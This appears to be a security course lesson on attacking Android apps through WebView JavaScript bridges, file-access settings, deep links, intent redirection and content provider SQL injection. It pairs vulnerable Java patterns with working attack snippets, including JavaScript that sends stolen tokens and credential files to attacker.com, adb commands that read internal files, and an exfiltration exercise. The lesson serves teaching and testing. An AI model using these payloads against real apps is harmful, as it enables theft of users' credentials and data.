---
title: "Android WebView and Intent Attacks — JS Bridge Abuse, Deep Link Hijacking, Intent Redirection"
tags: [android, WebView, intents, deep-links, intent-redirection, JavaScript-bridge,
       addJavascriptInterface, XSS, MASVS-PLATFORM, CWE-749, CWE-927, MITRE-T1418]
module: 04-BroadSurface-03
day: 217
related_topics:
  - Android Static Analysis (Day 212)
  - Android Insecure Storage (Day 216)
  - XSS Fundamentals (Day 90)
  - CSRF Fundamentals (Day 96)
---

# Day 217 — Android WebView and Intent Attacks

> "WebView is a browser embedded inside an app. Every XSS you learned in the
> web module is now also an Android bug — but the impact is higher, because
> XSS in a WebView can call native Java methods through the JavaScript bridge.
> That is not cookie theft. That is code execution inside the application
> process. And deep links? They are URL handlers with no validation, sitting
> right in the manifest, reachable from any browser on the device."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Explain how Android `WebView` works, what `addJavascriptInterface` exposes,
   and why it is dangerous.
2. Exploit a `WebView` that loads attacker-controlled content via a JavaScript
   bridge to call native Java methods.
3. Enumerate and exploit exported `Activity` components via Intent injection.
4. Exploit deep link URI scheme handlers with crafted inputs.
5. Demonstrate Intent redirection — stealing data delivered to a broadcast
   receiver via a crafted Intent.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Android component model (Activities, Intents) | Day 211 |
| Android Static Analysis | Day 212 |
| XSS fundamentals | Day 90 |

---

## Part 1 — WebView Attacks

### 1.1 — What WebView Is

`WebView` is a full Chromium browser embedded as a UI widget inside an Android
app. Apps use it to:

- Render HTML content from the backend
- Display local HTML files from `assets/`
- Implement hybrid apps (React Native, Ionic, Cordova)

The security context of a `WebView` is **the app process**. Any code running
inside the `WebView` has the opportunity to call native methods if a JavaScript
bridge is configured.

### 1.2 — JavaScript Bridge: addJavascriptInterface

`addJavascriptInterface` exposes a Java object to JavaScript running in the
`WebView`. JavaScript can call public methods on that object directly.

**Vulnerable pattern:**

```java
WebView webView = (WebView) findViewById(R.id.webview);
WebSettings settings = webView.getSettings();
settings.setJavaScriptEnabled(true);  // must be enabled for bridge to work

// DANGEROUS: exposing Java interface to JS
webView.addJavascriptInterface(new WebAppInterface(this), "AndroidBridge");

// Load a URL — if attacker controls this URL, they control the JS
webView.loadUrl(getIntent().getStringExtra("url"));  // URL from Intent parameter
```

**The bridge class:**

```java
public class WebAppInterface {
    Context context;

    WebAppInterface(Context c) { this.context = c; }

    @JavascriptInterface  // annotation marks this as callable from JS
    public void showToast(String msg) {
        Toast.makeText(context, msg, Toast.LENGTH_SHORT).show();
    }

    @JavascriptInterface
    public String getUserData() {
        // Returns sensitive user data to JavaScript
        SharedPreferences prefs = context.getSharedPreferences("user", 0);
        return prefs.getString("auth_token", "");  // token exposed to JS!
    }

    @JavascriptInterface
    public void executeCommand(String cmd) {  // RCE if this exists
        try { Runtime.getRuntime().exec(cmd); } catch (Exception e) {}
    }
}
```

**Attack:** any page loaded by this WebView can call:

```javascript
// From a malicious webpage loaded in the WebView
var token = window.AndroidBridge.getUserData();
// Send the stolen token to the attacker
fetch("https://attacker.com/steal?t=" + token);

// If executeCommand exists: RCE
window.AndroidBridge.executeCommand("id > /sdcard/pwned.txt");
```

### 1.3 — How to Find WebView Bridge Issues

```bash
# Find addJavascriptInterface calls
rg "addJavascriptInterface" --type java jadx_output/ -n

# Find JavascriptInterface-annotated methods
rg "@JavascriptInterface" --type java jadx_output/ -n

# Find setJavaScriptEnabled(true) — needed for XSS to execute
rg "setJavaScriptEnabled\s*\(\s*true\s*\)" --type java jadx_output/ -n

# Find loadUrl calls with externally controlled data
rg "loadUrl\s*\(" --type java jadx_output/ -n | \
    grep -v '"http'  # filter out hardcoded URLs
```

### 1.4 — Other Dangerous WebView Settings

| Setting | Risk |
|---|---|
| `setAllowFileAccess(true)` (default) | JS can read local files via `file://` URI |
| `setAllowFileAccessFromFileURLs(true)` | `file://` page can XHR other `file://` paths |
| `setAllowUniversalAccessFromFileURLs(true)` | `file://` page can XHR any URL (CORS bypass) |
| `setSavePassword(true)` | Passwords stored in WebView credential store |
| No `setDomStorageEnabled` check | XSS can use `localStorage` for persistence |

**Universal access XSS to file read:**

```javascript
// Attacker-controlled JS loaded in WebView with universal access enabled
var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///data/data/com.example.app/shared_prefs/creds.xml", false);
xhr.send();
document.write("<pre>" + xhr.responseText + "</pre>");
// Or exfiltrate:
fetch("https://attacker.com/data?d=" + btoa(xhr.responseText));
```

---

## Part 2 — Intent Attacks

### 2.1 — Exported Activity Abuse

Covered in Day 211 and Day 213. The new element here is using Intents to
pass data to exported activities and observe what they do with it.

```bash
# Launch exported activity with extra data
adb shell am start \
    -n com.example.app/.ViewDocumentActivity \
    --es "file_path" "/etc/passwd"

# Launch with a URL (file:// to read internal files via WebView)
adb shell am start \
    -n com.example.app/.WebViewActivity \
    --es "url" "file:///data/data/com.example.app/shared_prefs/creds.xml"
```

If the `WebViewActivity` loads the `url` extra directly into `loadUrl()` —
that is an arbitrary local file read.

### 2.2 — Deep Link URI Scheme Hijacking

Deep links (custom URI schemes) allow apps to handle URLs like `myapp://action`.
Attack vectors:

**1. Malicious web page:**

```html
<!-- On a webpage visited by the target user -->
<!-- Clicking this link opens the app via the deep link handler -->
<a href="myapp://reset-password?token=ATTACKER_TOKEN&email=victim@example.com">
    Click to reset your password
</a>
<!-- If the app processes the token without server-side validation, ATO is possible -->
```

**2. Malicious Android app:**

```java
// Attacker app that sends a crafted Intent to the target app's deep link handler
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("myapp://payment?amount=-100&account=attacker_id"));
intent.setPackage("com.example.targetapp");  // direct to target
startActivity(intent);
```

**3. Finding deep links to attack:**

```bash
# From manifest: look for BROWSABLE intent filters
grep -A 10 'BROWSABLE' decoded/AndroidManifest.xml

# From code: look for how URI parameters are processed
rg "getIntent\(\)\.getDataString\|Uri\.parse\|getQueryParameter" \
   --type java jadx_output/ -n | head -20
```

**Vulnerable handling:**

```java
// In exported Activity with deep link intent filter
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Uri data = getIntent().getData();
    if (data != null) {
        // DANGEROUS: directly using URI parameters without validation
        String redirectUrl = data.getQueryParameter("redirect");
        String token = data.getQueryParameter("token");

        // Open redirect: attacker can redirect to any URL
        webView.loadUrl(redirectUrl);  // open redirect via deep link

        // Auth bypass: if token matches locally stored token, skip auth
        if (token.equals(storedToken)) {
            bypassAuthentication();
        }
    }
}
```

### 2.3 — Intent Redirection

Intent redirection occurs when an app receives an Intent, extracts an embedded
Intent from it, and sends it to another component without validation.

**Vulnerable pattern:**

```java
// Step 1: exported Activity receives an Intent
// Step 2: extracts a "next Intent" from the extras
// Step 3: starts the extracted Intent — attacker controls destination

protected void onStart() {
    Intent intent = getIntent();
    // Vulnerable: trusts the caller to provide a valid next Intent
    Intent nextIntent = intent.getParcelableExtra("next_intent");
    if (nextIntent != null) {
        startActivity(nextIntent);  // attacker controls this
    }
}
```

**Attack:** an attacker app sends a crafted Intent to the exported Activity
with a `next_intent` that points to an internal (non-exported) Activity:

```java
// Attacker code
Intent outerIntent = new Intent();
outerIntent.setClassName("com.example.app", "com.example.app.AuthForwardActivity");

// The "next_intent" points to the internal admin Activity
Intent innerIntent = new Intent();
innerIntent.setClassName("com.example.app", "com.example.app.AdminActivity");
outerIntent.putExtra("next_intent", innerIntent);

startActivity(outerIntent);
// Result: AdminActivity opens without authentication
```

This is **CVE-class** level findings (many have assigned CVEs against major apps).

---

## Part 3 — Content Provider Attacks

Content Providers expose structured data (like a database). Exported providers
with weak access control are a common source of:

- Unauthorised data read/write
- SQL injection via the query URI
- Path traversal via file-based providers

### 3.1 — Find Exported Providers

```bash
grep -A 5 '<provider' decoded/AndroidManifest.xml | \
    grep -i "exported\|authority\|permission"

# In code: find providers and their query handling
rg "extends ContentProvider" --type java jadx_output/ -n
rg "ContentUris\|UriMatcher\|getContentResolver" --type java jadx_output/ -n
```

### 3.2 — SQL Injection via Content Provider

If a `ContentProvider.query()` implementation concatenates user-supplied
selection arguments into a raw SQL string:

```java
// INSECURE Content Provider implementation
@Override
public Cursor query(Uri uri, String[] projection, String selection,
                    String[] selectionArgs, String sortOrder) {
    SQLiteDatabase db = dbHelper.getReadableDatabase();
    // BUG: uses selection directly without parameterisation
    return db.rawQuery(
        "SELECT * FROM users WHERE " + selection,  // SQL injection here
        null
    );
}
```

**Attack via adb:**

```bash
adb shell content query \
    --uri "content://com.example.app.provider/users" \
    --where "1=1 UNION SELECT username,password,3,4 FROM users--"
```

---

## Key Takeaways

1. **JavaScript bridge + external URL = RCE potential.** If a WebView loads
   attacker-controlled content and has `addJavascriptInterface`, any method
   annotated with `@JavascriptInterface` is callable by the attacker's JS.
   No sandbox, no CORS — just direct Java method invocation.
2. **Deep links are unauthenticated entry points.** They are designed to be
   opened from browsers and other apps. Any data in a deep link URI should be
   validated server-side and never trusted as authoritative.
3. **Intent redirection = SSRF for Android.** An exported Activity that forwards
   a caller-controlled Intent breaks Android's component isolation model.
   An attacker can reach non-exported components by "going through" the
   exported one.
4. **WebView file access settings are devastatingly powerful when misconfigured.**
   `setAllowUniversalAccessFromFileURLs(true)` allows XSS in a `file://` page
   to read arbitrary files and exfiltrate them over the network.
5. **Every `getIntent().getExtra()` call that feeds into `loadUrl()` is a finding
   candidate.** Start with exported Activities that have WebViews; trace what
   data goes into `loadUrl()`.

---

## Exercises

1. Decompile any APK that uses WebView (search with `rg "WebView"`). Identify:
   (a) whether JavaScript is enabled, (b) whether `addJavascriptInterface` is
   called, (c) what URLs are loaded. If `addJavascriptInterface` is present,
   list the public methods on the exposed interface.

2. For InsecureBankv2: use `adb shell am start` to launch any exported
   activity with a `--es url` parameter set to `file:///etc/passwd`. Observe
   whether the app renders the file. Document the finding.

3. Write a proof-of-concept HTML file that, if loaded in a vulnerable WebView
   with a JS bridge, calls the bridge method `getUserData()` and exfiltrates
   the result to `https://attacker.example.com/steal`.

4. Research: what is the `android:exported` default for a component that
   declares `<intent-filter>`? How did this default change between Android 11
   and Android 12? What is the security implication?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q217.1, Q217.2 …).
> Follow-up questions use hierarchical numbering (Q217.1.1, Q217.1.2 …).

---

## Navigation

← Previous: [Day 216 — Android Insecure Storage](DAY-0216-Android-Insecure-Storage.md)
→ Next: [Day 218 — iOS App Security Overview](DAY-0218-iOS-App-Security-Overview.md)
